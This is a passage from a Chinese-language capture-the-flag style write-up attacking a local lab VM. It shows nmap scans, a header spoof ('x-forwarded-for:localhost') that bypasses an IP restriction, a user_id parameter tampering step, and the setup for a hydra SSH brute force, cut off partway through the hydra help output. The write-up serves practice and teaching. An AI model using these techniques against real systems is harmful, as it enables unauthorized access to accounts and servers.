<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.30</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.010</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">88</span><span class="p">:</span><span class="nx">B1</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">7</span><span class="nx">D</span><span class="p">:</span><span class="mi">83</span><span class="p">:</span><span class="mi">45</span> <span class="p">(</span><span class="nx">Intel</span> <span class="nx">Corporate</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.32</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="o">-</span><span class="mf">0.10</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">68</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="nx">D5</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="nx">Intel</span> <span class="nx">Corporate</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.33</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="o">-</span><span class="mf">0.094</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">94</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="nx">E0</span><span class="p">:</span><span class="mi">1</span><span class="nx">B</span><span class="p">:</span><span class="nx">F2</span><span class="p">:</span><span class="nx">D5</span> <span class="p">(</span><span class="nx">Unknown</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.34</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.010</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="nx">F4</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="nx">E2</span><span class="p">:</span><span class="mi">8</span><span class="nx">B</span><span class="p">:</span><span class="nx">C8</span><span class="p">:</span><span class="nx">BC</span> <span class="p">(</span><span class="nx">Unknown</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.40</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">24</span><span class="p">:</span><span class="nx">DF</span><span class="p">:</span><span class="mi">6</span><span class="nx">A</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="nx">C6</span><span class="p">:</span><span class="mi">8</span><span class="nx">E</span> <span class="p">(</span><span class="nx">Huawei</span> <span class="nx">Technologies</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.00033</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="nx">FD</span><span class="p">:</span><span class="mi">9</span><span class="nx">B</span><span class="p">:</span><span class="mi">9</span><span class="nx">B</span> <span class="p">(</span><span class="nx">Oracle</span> <span class="nx">VirtualBox</span> <span class="nx">virtual</span> <span class="nx">NIC</span><span class="p">)</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="nx">bin4xin</span> <span class="p">(</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">3.60</span><span class="p">)</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span><span class="p">.</span>
<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">256</span> <span class="nx">IP</span> <span class="nx">addresses</span> <span class="p">(</span><span class="mi">12</span> <span class="nx">hosts</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">5.35</span> <span class="nx">seconds</span>
</code></pre></div></div>
<p>看到oracle virtual box后缀结尾的，靶机ip为<code class="language-plaintext highlighter-rouge">192.168.3.59</code>
扫描一波端口先：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">A</span> <span class="o">-</span><span class="nx">O</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span>

<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.60</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2020-01-08 10:08 UTC</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.00022</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span> <span class="nx">shown</span><span class="p">:</span> <span class="mi">998</span> <span class="nx">closed</span> <span class="nx">ports</span>
<span class="nx">PORT</span>   <span class="nx">STATE</span> <span class="nx">SERVICE</span> <span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">ssh</span>     <span class="nx">OpenSSH</span> <span class="mf">6.6</span><span class="p">.</span><span class="mi">1</span><span class="nx">p1</span> <span class="nx">Ubuntu</span> <span class="mi">2</span><span class="nx">ubuntu2</span><span class="p">.</span><span class="mi">13</span> <span class="p">(</span><span class="nx">Ubuntu</span> <span class="nx">Linux</span><span class="p">;</span> <span class="nx">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span>
<span class="o">|</span>   <span class="mi">1024</span> <span class="mi">57</span><span class="p">:</span><span class="nx">e1</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mi">3</span><span class="nx">d</span><span class="p">:</span><span class="nx">c3</span><span class="p">:</span><span class="mi">4</span><span class="nx">b</span><span class="p">:</span><span class="nx">a7</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="nx">ee</span><span class="p">:</span><span class="mi">23</span><span class="p">:</span><span class="mi">16</span> <span class="p">(</span><span class="nx">DSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">3</span><span class="nx">b</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">4</span><span class="nx">d</span><span class="p">:</span><span class="nx">e4</span><span class="p">:</span><span class="nx">a0</span><span class="p">:</span><span class="mi">3</span><span class="nx">b</span><span class="p">:</span><span class="nx">f8</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="nx">d9</span><span class="p">:</span><span class="mi">6</span><span class="nx">e</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">8</span><span class="nx">c</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">97</span> <span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">8</span><span class="nx">f</span><span class="p">:</span><span class="mi">48</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="mi">9</span><span class="nx">b</span><span class="p">:</span><span class="mi">55</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">5</span><span class="nx">b</span><span class="p">:</span><span class="nx">f1</span><span class="p">:</span><span class="mi">6</span><span class="nx">c</span><span class="p">:</span><span class="mi">1</span><span class="nx">d</span><span class="p">:</span><span class="nx">b3</span><span class="p">:</span><span class="mi">4</span><span class="nx">a</span><span class="p">:</span><span class="nx">bc</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="nx">bd</span><span class="p">:</span><span class="nx">b0</span> <span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span>  <span class="mi">256</span> <span class="nx">d0</span><span class="p">:</span><span class="nx">c3</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="nx">a1</span><span class="p">:</span><span class="nx">c4</span><span class="p">:</span><span class="nx">c2</span><span class="p">:</span><span class="nx">a8</span><span class="p">:</span><span class="nx">ac</span><span class="p">:</span><span class="mi">3</span><span class="nx">b</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="nx">ae</span><span class="p">:</span><span class="mi">8</span><span class="nx">f</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">76</span> <span class="p">(</span><span class="nx">EdDSA</span><span class="p">)</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">http</span>    <span class="nx">Apache</span> <span class="nx">httpd</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">7</span> <span class="p">((</span><span class="nx">Ubuntu</span><span class="p">))</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">7</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span> <span class="nx">Site</span> <span class="nx">doesn</span><span class="dl">'</span><span class="s1">t have a title (text/html).
MAC Address: 08:00:27:FD:9B:9B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.3.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
</span></code></pre></div></div>
<p>中间<code class="language-plaintext highlighter-rouge">web</code>部分是一个ip限制的考点，在request头部加上<code class="language-plaintext highlighter-rouge">x-forwarded-for:localhost</code>就可以绕过了，之后进去是一个登录页面，大致内容是参数暴露信息的漏洞：
抓用户信息包，如下</p>
<h2 id="localhost限制">localhost限制</h2>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">GET</span> <span class="o">/</span><span class="p">?</span><span class="nx">page</span><span class="o">=</span><span class="nx">index</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nx">Host</span><span class="p">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.59</span>
<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">;</span> <span class="nl">rv</span><span class="p">:</span><span class="mf">71.0</span><span class="p">)</span> <span class="nx">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="nx">Firefox</span><span class="o">/</span><span class="mf">71.0</span>
<span class="nx">Accept</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="cm">/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
x-forwarded-for:localhost
Connection: close
Upgrade-Insecure-Requests: 1
</span></code></pre></div></div>
<p>回显，加上本地头ip后回显正常本地根目录登录页面：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="nx">OK</span>
<span class="nb">Date</span><span class="p">:</span> <span class="nx">Wed</span><span class="p">,</span> <span class="mi">08</span> <span class="nx">Jan</span> <span class="mi">2020</span> <span class="mi">09</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">34</span> <span class="nx">GMT</span>
<span class="nx">Server</span><span class="p">:</span> <span class="nx">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="mi">7</span> <span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
<span class="nx">X</span><span class="o">-</span><span class="nx">Powered</span><span class="o">-</span><span class="nx">By</span><span class="p">:</span> <span class="nx">PHP</span><span class="o">/</span><span class="mf">5.5</span><span class="p">.</span><span class="mi">9</span><span class="o">-</span><span class="mi">1</span><span class="nx">ubuntu4</span><span class="p">.</span><span class="mi">29</span>
<span class="nb">Set</span><span class="o">-</span><span class="nx">Cookie</span><span class="p">:</span> <span class="nx">PHPSESSID</span><span class="o">=</span><span class="mi">72</span><span class="nx">l97ppkrc8kgffl3n72dv37f3</span><span class="p">;</span> <span class="nx">path</span><span class="o">=</span><span class="sr">/</span><span class="err">
</span><span class="nx">Expires</span><span class="p">:</span> <span class="nx">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="nx">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">00</span> <span class="nx">GMT</span>
<span class="nx">Cache</span><span class="o">-</span><span class="nx">Control</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">store</span><span class="p">,</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span><span class="p">,</span> <span class="nx">must</span><span class="o">-</span><span class="nx">revalidate</span><span class="p">,</span> <span class="nx">post</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="nx">pre</span><span class="o">-</span><span class="nx">check</span><span class="o">=</span><span class="mi">0</span>
<span class="nx">Pragma</span><span class="p">:</span> <span class="nx">no</span><span class="o">-</span><span class="nx">cache</span>
<span class="nx">Vary</span><span class="p">:</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="p">:</span> <span class="mi">676</span>
<span class="nx">Connection</span><span class="p">:</span> <span class="nx">close</span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span>

<span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">html</span> <span class="nx">lang</span><span class="o">=</span><span class="dl">"</span><span class="s2">en</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">charset</span><span class="o">=</span><span class="dl">"</span><span class="s2">UTF-8</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">viewport</span><span class="dl">"</span> <span class="nx">content</span><span class="o">=</span><span class="dl">"</span><span class="s2">width=device-width, initial-scale=1.0</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="dl">"</span><span class="s2">X-UA-Compatible</span><span class="dl">"</span> <span class="nx">content</span><span class="o">=</span><span class="dl">"</span><span class="s2">ie=edge</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Ceban</span> <span class="nx">Corp</span><span class="o">&lt;</span><span class="sr">/title</span><span class="err">&gt;
</span>    <span class="o">&lt;</span><span class="nx">style</span><span class="o">&gt;</span>
        <span class="p">.</span><span class="nx">center</span> <span class="p">{</span>
            <span class="nx">text</span><span class="o">-</span><span class="nx">align</span><span class="p">:</span> <span class="nx">center</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="o">&lt;</span><span class="sr">/style</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>

    <span class="o">&lt;</span><span class="nx">div</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">center</span><span class="dl">"</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">Welcome</span> <span class="nx">To</span> <span class="nx">Ceban</span> <span class="nx">Corp</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span><span class="nx">Inspiring</span> <span class="nx">The</span> <span class="nx">People</span> <span class="nx">To</span> <span class="nx">Great</span> <span class="nx">Again</span><span class="o">!&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>        <span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>
                <span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">?page=index</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Home</span><span class="o">&lt;</span><span class="sr">/a&gt; | &lt;a href="</span><span class="se">?</span><span class="sr">page=login"&gt;Login&lt;/</span><span class="nx">a</span><span class="o">&gt;</span> <span class="o">|</span> 
                <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">?page=register</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Register</span><span class="o">&lt;</span><span class="sr">/a&gt; | &lt;a href="</span><span class="se">?</span><span class="sr">page=about"&gt;About&lt;/</span><span class="nx">a</span><span class="o">&gt;&lt;</span><span class="sr">/p</span><span class="err">&gt;
</span>                <span class="o">&lt;</span><span class="nx">hr</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
</span>
    
<span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span>
</code></pre></div></div>

<hr />

<h1 id="利用漏洞">利用漏洞</h1>
<p>绕过ip限制后，主页<code class="language-plaintext highlighter-rouge">注册</code>-<code class="language-plaintext highlighter-rouge">登录</code>-<code class="language-plaintext highlighter-rouge">修改user_id参数</code>，burpsuite参数截图如下：
<img src="/assets/img/post-pic/post-gf-bp.png" alt="" /></p>

<h1 id="连接靶机">连接靶机</h1>

<p>hydra爆破ssh
根据web爆出的用户名密码新建user、pass文件，尝试使用海德拉爆破ssh服务：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">bin4xin</span><span class="err">#</span> <span class="nx">cd</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="o">/</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">ls</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">vi</span> <span class="nx">user</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">ls</span>
<span class="nx">user</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">vi</span> <span class="nx">pass</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">vi</span> <span class="nx">user</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span>
</code></pre></div></div>
<p>输入<code class="language-plaintext highlighter-rouge">hydra -h</code>查看一下ssh爆破命令：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">bin4xin</span><span class="p">:</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlist</span><span class="err">#</span> <span class="nx">hydra</span> <span class="o">-</span><span class="nx">h</span>
<span class="nx">Hydra</span> <span class="nx">v8</span><span class="p">.</span><span class="mi">6</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="mi">2017</span> <span class="nx">by</span> <span class="nx">van</span> <span class="nx">Hauser</span><span class="o">/</span><span class="nx">THC</span> <span class="o">-</span> <span class="nx">Please</span> <span class="k">do</span> <span class="nx">not</span> <span class="nx">use</span> <span class="k">in</span> <span class="nx">military</span> <span class="nx">or</span> <span class="nx">secret</span> <span class="nx">service</span> <span class="nx">organizations</span><span class="p">,</span> <span class="nx">or</span> 
<span class="k">for</span> <span class="nx">illegal</span> <span class="nx">purposes</span><span class="p">.</span>

<span class="nx">Syntax</span><span class="p">:</span> <span class="nx">hydra</span> <span class="p">[[[</span><span class="o">-</span><span class="nx">l</span> <span class="nx">LOGIN</span><span class="o">|-</span><span class="nx">L</span> <span class="nx">FILE</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">p</span> <span class="nx">PASS</span><span class="o">|-</span><span class="nx">P</span> <span class="nx">FILE</span><span class="p">]]</span> <span class="o">|</span> <span class="p">[</span><span class="o">-</span><span class="nx">C</span> <span class="nx">FILE</span><span class="p">]]</span> <span class="p">[</span><span class="o">-</span><span class="nx">e</span> <span class="nx">nsr</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">o</span> <span class="nx">FILE</span><span class="p">]</span> 
<span class="p">[</span><span class="o">-</span><span class="nx">t</span> <span class="nx">TASKS</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">M</span> <span class="nx">FILE</span> <span class="p">[</span><span class="o">-</span><span class="nx">T</span> <span class="nx">TASKS</span><span class="p">]]</span> <span class="p">[</span><span class="o">-</span><span class="nx">w</span> <span class="nx">TIME</span><span class="p">]</span> 
<span class="p">[</span><span class="o">-</span><span class="nx">W</span> <span class="nx">TIME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">f</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">s</span> <span class="nx">PORT</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">x</span> <span class="nx">MIN</span><span class="p">:</span><span class="nx">MAX</span><span class="p">:</span><span class="nx">CHARSET</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">c</span> <span class="nx">TIME</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">ISOuvVd46</span><span class="p">]</span> <span class="p">[</span><span class="nx">service</span><span class="p">:</span><span class="c1">//server[:PORT][/OPT]]</span>

<span class="nx">Options</span><span class="p">:</span>
  <span class="o">-</span><span class="nx">R</span>        <span class="nx">restore</span> <span class="nx">a</span> <span class="nx">previous</span> <span class="nx">aborted</span><span class="o">/</span><span class="nx">crashed</span> <span class="nx">session</span>
  <span class="o">-</span><span class="nx">I</span>        <span class="nx">ignore</span> <span class="nx">an</span> <span class="nx">existing</span> <span class="nx">restore</span> <span class="nx">file</span> <span class="p">(</span><span class="nx">don</span><span class="dl">'</span><span class="s1">t wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, </span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1"> to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
  -O        use old SSL v2 and v3
  -q        do not print messages about connection errors
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: 
adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}
-form http-proxy http-proxy-urlenum 
icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5]
[s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2
rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp
